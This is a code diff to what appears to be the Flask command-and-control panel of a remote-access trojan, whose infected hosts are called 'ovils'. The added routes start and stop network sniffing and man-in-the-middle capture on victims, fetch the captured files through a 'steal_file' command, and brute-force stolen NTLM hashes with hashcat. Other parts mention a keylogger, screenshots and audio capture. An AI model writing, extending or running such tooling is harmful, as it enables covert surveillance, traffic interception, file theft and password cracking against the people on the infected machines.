@@ -1,3 +1,4 @@
+from hashcat.runp import runp
 import multiprocessing
 import os
 import subprocess
@@ -24,15 +25,15 @@ from datetime import datetime
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_DEFAULT_PATH
 # turbo = Turbo(app)
-# ovils: List[Client] = [Client("127.0.0.1"), Client("127.0.0.2"), Client("127.0.0.3"), Client("127.0.0.4"),
-#                        Client("127.0.0.5"), Client("127.0.0.6"), Client("127.0.0.7")]
-dynamic_mitm_ovil: Client | None = None
+# ovils: List[Client] = [Client("15.165.32.1"), Client("15.35.21.65"), Client("127.0.0.1"), Client("1.1.2.4"),
+#                        Client("192.168.0.15"), Client("192.168.0.16"), Client("8.8.8.5")]
 screenshot_taken: List[bool | str] = [False, False, ""] # first indicates whether screenshot command sent and second mean if it succeded and third is the error msg
 
 ovils: List[Client] = []
 
 
 def handle_errors(func: Callable[..., str]) -> Callable[..., str]:
+
     def inner(*args, **kwargs) -> str:
         try:
             return func(*args, **kwargs)
@@ -57,6 +58,7 @@ def handle_disconnection(func: Callable) -> Callable:
 
 def is_connected(ip: str) -> bool:
     return ip in ovils and ovils[ovils.index(ip)].connected
+
 
 @app.route('/')
 @handle_errors
@@ -118,7 +120,10 @@ def disconnect(ip):
 @app.route("/ovil/<ip>/staticmitm/")
 @handle_errors
 def staticmitm(ip):
-    return render_template("staticmitm.html")
+    started = is_mitm_runs(ip)
+    if type(started) == str:
+        return render_template("big_massage.html", ip=ip, msg=started, tab="Static MITM")
+    return render_template("staticmitm.html", started=started)
 
 
 @app.route("/ovil/<ip>/staticmitm/start/", methods=["GET"])
@@ -127,41 +132,104 @@ def start_staticmitm(ip):
     name = request.args.get("name")
     if ip not in ovils:
         return "This ovil is not connected"
+    started = is_mitm_runs(ip)
+    if type(started) == str:
+        return started
+    if started:
+        return "could not start MITM because it has already started"
     i = ovils.index(ip)
     ovil = ovils[i]
     result = ovil.send_command("start_sniffing_to_file", [name])
     if result == Massages.OK.value:
+        ovil.mitm_filename = name
         return "MITM started successfully"
     elif result == Massages.NOT_OK.value:
-        return "could not start MITM because it has already started"
+        return "could not start MITM for unknown reason"
     return result
+
+
+@app.route("/ovil/<ip>/staticmitm/stop/", methods=["GET"])
+@handle_errors
+def stop_staticmitm(ip):
+    started = is_mitm_runs(ip)
+    if type(started) == str:
+        return started
+    if not started:
+        return "could not stop MITM because it has already stopped"
+    i = ovils.index(ip)
+    ovil = ovils[i]
+    result = ovil.send_command("stop_sniffing", [])
+    if result == Massages.OK.value:
+        msg = "MITM started successfully "
+        succ, filename = get_file(ovil, ovil.mitm_filename)
+        if succ:
+            msg += f"and saved as {filename}"
+        else:
+            msg += f"but coudln't get the file info because {filename}"
+        return msg
+    elif result == Massages.NOT_OK.value:
+        return "could not start MITM for unknown reason"
+    return result
+
+
+@handle_errors
+@handle_disconnection
+def is_mitm_runs(ip):
+    i = ovils.index(ip)
+    ovil = ovils[i]
+    result = ovil.send_command("is_mitm_runs", [])
+    return semi_msg_to_bool(result)
 
 
 @app.route("/ovil/<ip>/dynamicmitm/")
 @handle_errors
 def dynamicmitm(ip):
-    result = start_dynamicmitm(ip)
-    if type(result) == str:
-        return render_template("big_massage.html", ip=ip, msg=result, tab="Dynamic MITM")
+    connected = is_mitm_runs(ip)
+    if type(connected) == str:
+        return render_template("big_massage.html", ip=ip, msg=connected, tab="Dynamic MITM")
+    if not connected:
+        result = start_dynamicmitm(ip)
+        if type(result) == str:
+            return render_template("big_massage.html", ip=ip, msg=result, tab="Dynamic MITM")
+
+    connected = is_mitm_runs(ip)
+    if type(connected) == str:
+        return render_template("big_massage.html", ip=ip, msg=connected, tab="Dynamic MITM")
+    if not connected:
+        return render_template("big_massage.html", ip=ip, msg="Couldn't start MITM", tab="Dynamic MITM")
     i = ovils.index(ip)
     ovil = ovils[i]
-    return render_template("dynamicmitm.html", data=ovil.mitm_info)
+    return render_template("dynamicmitm.html", data="\n".join(ovil.mitm_info), connected=True)
+
+
+@app.route("/ovil/<ip>/dynamicmitm/stop")
+@handle_errors
+@handle_disconnection
+def stop_dynamic_mitm(ip):
+    connected = is_mitm_runs(ip)
+    if type(connected) == str:
+        return connected
+    if not connected:
+        return "Can't stop a stopped MITM"
+    ovil = ovils[ovils.index(ip)]
+    result = ovil.send_command("stop_sniffing", [])
+    if msg_to_bool(result):
+        return "Stopped Successfully"
+    if semi_msg_to_bool(result):
+        return result
+    return "Couldn't stop!!"
 
 
 def start_dynamicmitm(ip) -> str | bool:
     if ip not in ovils:
         return "Can't start KeyLogger on a disconnected ovil"
-    global dynamic_mitm_ovil
-    if dynamic_mitm_ovil:
-        return "Can't run 2 dynamic MITM simultaneously"
     i = ovils.index(ip)
     ovil = ovils[i]
     result: str = ovil.send_command("start_sniffing_on_net", [])
     if result == Massages.OK.value:
-        dynamic_mitm_ovil = ovil
         return True
     elif result == Massages.NOT_OK.value:
-        return False
+        return "Unknown error!"
     return result
 
 
@@ -263,20 +331,24 @@ def crack_passwords(passwords: str, timeout: int | None = MAX_TIME_TO_WAIT_FOR_C
                 line = line.split(":")
                 hashes.append(line[-1])
                 users[line[0]] = line[-1]
-        with open("hash.txt", "w") as h:
+        with open("hashcat\\hash.txt", "w") as h:
             h.write("\n".join(hashes))
-        with open("cracked.txt", "w") as c:
+        with open("hashcat\\cracked.txt", "w") as c:
             c.write("")
-        p = multiprocessing.Process(target=os.system, args=("hashcat64.exe -m 1000 -a3 -o cracked.txt hash.txt", ))
+        args = (["hashcat.exe", "-m", "1000", "-a3", "-o", "cracked.txt", "hash.txt"], "hashcat")
+
+        p = multiprocessing.Process(target=runp, args=args)
         p.start()
         p.join(timeout)
         msg = ""
-        with open("cracked.txt", "r") as c:
+        with open("hashcat\\cracked.txt", "r") as c:
             for line in c.readlines():
                 line = line.strip()
                 if ":" in line:
                     h, password = line.split(":")
                     msg += f"{users[h]}:{password}"
+        if not msg:
+            return "time ran out! this is a hard password. you can try wait for longer or give up..."
         return msg
     except Exception as e:
         return f"couldn't crack hash because {e}"
@@ -385,7 +457,7 @@ def stop_audio(ip):
 
 def get_file(ovil: Client, filename: str) -> Tuple[bool, str]:
     """
-    retur a tuple of whether succeded and the filename if succeded or error massage
+    returns a tuple of whether succeded and the filename if succeded or error massage
     """
     succ, msg = ovil.send_command("steal_file", [filename])
     if msg.startswith(":Error: "):
@@ -821,14 +893,17 @@ def run(ip):
 
 
 def main():
-    webbrowser.open_new(r"http://127.0.0.1:5000")
-    app.run(debug=False)
-
+    try:
+        webbrowser.open_new(r"http://127.0.0.1:5000")
+        app.run(debug=False)
+    finally:
+        for ovil in ovils:
+            ovil.disconnect()
 
 if __name__ == '__main__':
     main()
 
 
 # TODO: make setup file
-# TODO: add decrypting ntlm hash by bruteforce
+
 
